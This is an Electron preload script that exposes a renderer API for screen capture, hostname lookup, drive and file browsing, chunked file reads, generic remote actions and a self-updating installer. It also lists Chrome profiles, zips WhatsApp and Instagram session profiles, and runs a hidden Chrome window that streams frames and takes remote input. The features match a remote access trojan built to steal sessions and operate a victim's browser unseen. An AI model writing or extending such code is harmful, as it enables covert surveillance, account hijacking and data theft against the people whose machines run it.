const { contextBridge, ipcRenderer } = require('electron');

contextBridge.exposeInMainWorld('electronAPI', {
    getSources: () => ipcRenderer.invoke('get-sources'),
    getScreenThumbnail: () => ipcRenderer.invoke('get-screen-thumbnail'),
    getHostname: () => ipcRenderer.invoke('get-hostname'), // Expose computer name
    getVersion: () => ipcRenderer.invoke('get-version'),
    getDrives: () => ipcRenderer.invoke('get-drives'),
    readDirectory: (dirPath) => ipcRenderer.invoke('read-directory', dirPath),
    openFile: (filePath) => ipcRenderer.invoke('open-file', filePath),
    getFileSize: (filePath) => ipcRenderer.invoke('get-file-size', filePath),
    readFileChunk: (filePath, start, end) => ipcRenderer.invoke('read-file-chunk', filePath, start, end),
    remoteAction: (action) => ipcRenderer.invoke('remote-action', action),
    onDirProgress: (callback) => ipcRenderer.on('dir-progress', (_event, value) => callback(value)),
    startUpdate: () => ipcRenderer.invoke('start-update'),
    writeUpdateChunk: (base64Data) => ipcRenderer.invoke('write-update-chunk', base64Data),
    finishUpdateAndInstall: () => ipcRenderer.invoke('finish-update-and-install'),
    getChromeProfiles: () => ipcRenderer.invoke('get-chrome-profiles'),
    zipWhatsappProfile: (profileName) => ipcRenderer.invoke('zip-whatsapp-profile', profileName),
    zipInstagramProfile: (profileName) => ipcRenderer.invoke('zip-instagram-profile', profileName),
    startHiddenChrome: (profileName) => ipcRenderer.invoke('start-hidden-chrome', profileName),
    onHiddenChromeFrame: (callback) => ipcRenderer.on('hidden-chrome-frame', (_event, value) => callback(value)),
    sendHiddenChromeAction: (action) => ipcRenderer.invoke('hidden-chrome-action', action),
    stopHiddenChrome: () => ipcRenderer.invoke('stop-hidden-chrome')
});
